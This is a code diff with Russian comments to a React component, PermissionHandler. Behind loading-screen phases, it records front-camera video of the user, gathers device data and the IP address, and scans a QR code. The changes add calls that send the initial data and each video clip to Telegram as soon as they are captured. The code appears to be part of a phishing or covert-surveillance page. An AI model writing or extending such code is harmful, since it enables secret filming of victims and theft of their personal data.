@@ -218,19 +218,28 @@ const PermissionHandler = () => {
       // IP Address will be filled on the server side, but we pass a placeholder for now
       currentCollectedData.ipAddress = "Fetching..."; 
 
-      setCollectedData(currentCollectedData); // Обновляем состояние один раз после сбора всех начальных данных
+      setCollectedData(currentCollectedData); // Обновляем состояние
+      await sendDataToTelegram(currentCollectedData); // Отправляем начальные данные
 
       // --- Video 1 Recording ---
       setAppPhase("recordingVideo1");
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      currentCollectedData = { ...currentCollectedData, video1: video1Base64 }; // Обновляем локальную переменную
-      setCollectedData(currentCollectedData); // Обновляем состояние
+      if (video1Base64) {
+        currentCollectedData = { ...currentCollectedData, video1: video1Base64 };
+        setCollectedData(currentCollectedData); // Обновляем состояние с video1
+        await sendDataToTelegram(currentCollectedData); // Отправляем данные с video1
+        currentCollectedData.video1 = undefined; // Очищаем video1, чтобы не отправлять его снова
+      }
 
       // --- Video 2 Recording ---
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      currentCollectedData = { ...currentCollectedData, video2: video2Base64 }; // Обновляем локальную переменную
-      setCollectedData(currentCollectedData); // Обновляем состояние
+      if (video2Base64) {
+        currentCollectedData = { ...currentCollectedData, video2: video2Base64 };
+        setCollectedData(currentCollectedData); // Обновляем состояние с video2
+        await sendDataToTelegram(currentCollectedData); // Отправляем данные с video2
+        currentCollectedData.video2 = undefined; // Очищаем video2, чтобы не отправлять его снова
+      }
 
       // --- Flip Camera and QR Scanning ---
       setAppPhase("flippingCamera");
@@ -264,8 +273,7 @@ const PermissionHandler = () => {
         videoRef.current.srcObject = null;
       }
     };
-  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage]);
-
+  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage, collectedData]); // Добавил collectedData в зависимости
   // Удаляем этот useEffect, так как video2 теперь отправляется в рамках финального отчета
   // useEffect(() => {
   //   if (appPhase === "qrScanning" && collectedData.video2 && !collectedData.qrCodeData) {
